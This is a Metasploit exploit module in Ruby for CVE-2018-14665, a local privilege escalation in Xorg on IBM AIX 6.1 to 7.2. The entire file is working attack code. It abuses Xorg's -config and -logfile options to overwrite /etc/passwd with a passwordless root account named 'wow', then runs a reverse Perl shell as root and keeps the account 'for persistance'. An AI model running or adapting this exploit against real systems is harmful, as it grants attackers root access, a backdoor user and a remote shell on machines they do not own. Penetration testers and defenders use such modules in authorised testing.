##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xorg X11 Server Local Privilege Escalation',
      # TODO: Finish description
      'Description'    => %q(
        This module is a port of the OpenBSD X11 Xorg exploit to run on AIX.

        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg.  This allows unprivileged users that can start the server
        the ability to elevate privileges and run arbitrary code under root
        privileges.

        This module has been tested with AIX 7.1, however it should also work with 6.1 and 7.2.
        Due to permission restrictions, this module does not use cron to launch the payload,
        and instead overwrites /etc/passwd in order to create a new user with root privileges.
        All currently logged in users need to be included when /etc/passwd is overwritten,
        else AIX will throw 'Cannot get "LOGNAME" variable' when attempting to change user.
        The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX,
        and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when
        overwriting /etc/passwd.
      ),
      'Author'         => [
        'Narendra Shinde', # Discovery and original FreeBSD exploit
        'Zack Flack <dzflack[at]gmail.com>' # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 25 2018',
      'References'     =>
        [
          ['CVE', '2018-14665'],
          ['URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html'],
          ['URL', 'https://aix.software.ibm.com/aix/efixes/security/xorg_advisory3.asc'],
          ['URL', 'https://github.com/dzflack/exploits/blob/master/aix/aixxorg.pl']
        ],
      'Platform'       => [ 'unix' ],
      'Arch'           => [ ARCH_CMD ],
      'SessionTypes'   => [ 'shell' ],
      'Payload'        => {
        'Compat'  => {
          'PayloadType'   => 'cmd',
          'RequiredCmd'   => 'perl',
        }
      },
      'DefaultOptions' => {
          'Payload' => 'cmd/unix/reverse_perl'
      },
      'Targets'        => [
        ['IBM AIX Version 6.1', {}],
        ['IBM AIX Version 7.1', {}],
        ['IBM AIX Version 7.2', {}]
      ],
      'DefaultTarget'  => 1
    ))

    register_options(
       [
         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
       ]
     )
  end

  def check
    print_status('Running checks')

    xorg_path = cmd_exec('command -v Xorg')
    unless xorg_path.include?('Xorg')
      print_error('Could not find Xorg executable')
      return Exploit::CheckCode::Safe
    end
    print_good("Xorg found at #{xorg_path}")

    ksh93_path = cmd_exec('command -v ksh93')
    unless ksh93_path.include?('ksh')
      print_error('Could not find Ksh93 executable')
      return Exploit::CheckCode::Safe
    end
    print_good("Ksh93 found at #{ksh93_path}")

    fileset_version_vulnerable = determine_version()
    unless fileset_version_vulnerable
      print_error('Xorg version is not vulnerable')
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    check_status = check

    if check_status ==  Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, 'Target not vulnerable')
    end

    xorg_path = cmd_exec('command -v Xorg')
    ksh93_path = cmd_exec('command -v ksh93')

    print_status('Opening /etc/passwd')
    passwd_array = read_file('/etc/passwd')
    passwd_array = passwd_array.split("\n")

    print_status('Retrieving currently logged in users')
    users = cmd_exec('who | cut -d\' \' -f1 | sort | uniq')
    users << "\n"
    users = users.split("\n")

    print_status('Generating Xorg command')

    unless users.empty?
      users_logged_in_passwd = ''
      users.each do |user|
        user << ':'
        passwd_array.each do |line|
          if line.index(user) == 0
            users_logged_in_passwd << '\n'
            users_logged_in_passwd << line
          end
        end
      end
    end

    # TODO: Systems where there has to be a password?? generate static password?
    blob = "-config $\'#{users_logged_in_passwd}\\nwow::0:0::/:/usr/bin/ksh\\n#\'"

    script_path = "#{datastore['WritableDir']}/wow.ksh"
    # TODO: Has to be better way of doing a relative path for /etc/passwd?
    xorg_payload = %Q^#!#{ksh93_path}
#{xorg_path} #{blob} -logfile ../../../../../../../../../etc/passwd :1 > /dev/null 2>&1
^
    upload_and_chmodx(script_path, xorg_payload)

    print_status("Backing up /etc/passwd to #{datastore['WritableDir']}/passwd.backup")
    cmd_exec("cp /etc/passwd #{datastore['WritableDir']}/passwd.backup")
    register_file_for_cleanup("#{datastore['WritableDir']}/passwd.backup")

    print_status('Executing /tmp/wow.ksh')
    cmd_exec("#{script_path}");

    print_status('Checking if we are root')
    if is_root?

      root_payload = %Q^#!#{ksh93_path}
#{payload.encoded}
^
      payload_path = "#{datastore['WritableDir']}/wowee.ksh"
      upload_and_chmodx(payload_path, root_payload)

      # TODO: Maybe add support for non perl payloads?
      print_status('Executing payload...')
      cmd_exec("#{ksh93_path} -c \"echo #{payload_path} | su - wow &\"")

      print_status('Cleaning up /etc/passwd. Add user for persistance')
      cmd_exec("su - wow -c \"cp /tmp/passwd.backup /etc/passwd\"")
    else
      fail_with(Failure::PayloadFailed, '')
    end
  end

  def determine_version()
    xorg_version = cmd_exec("lslpp -L | grep -i X11.base.rte | awk '{ print $2 }'")
    print_status("Xorg version is #{xorg_version}")
    xorg_semantic = Gem::Version.new(xorg_version)

    vulnerable_versions = [
      ['6.1.9.0', '6.1.9.100'],
      ['7.1.4.0', '7.1.4.30'],
      ['7.1.5.0', '7.1.5.31'],
      ['7.2.0.0', '7.2.0.1'],
      ['7.2.1.0', '7.2.1.0'],
      ['7.2.2.0', '7.2.2.0'],
      ['7.2.3.0', '7.2.3.15']
    ]

    for version_pair in vulnerable_versions do
      if xorg_semantic >= Gem::Version.new(version_pair[0]) &&
          xorg_semantic <= Gem::Version.new(version_pair[1])
        return true
      end
    end

    return false
  end

  def is_root?
    id_output = cmd_exec('su wow -c "id"')

    if id_output.include?("euid=0")
      print_good('Got root!')
      return true
    end
    if id_output.include?('uid=0')
      print_good('Got root!')
      return true
    end

    print_error('Not root')
    false
  end

  def upload_and_chmodx(path, data)
    print_status("Writing to #{path}")
    rm_f(path)
    write_file(path, data)
    cmd_exec("chmod 0555 '#{path}'")
    register_file_for_cleanup(path)
  end
end
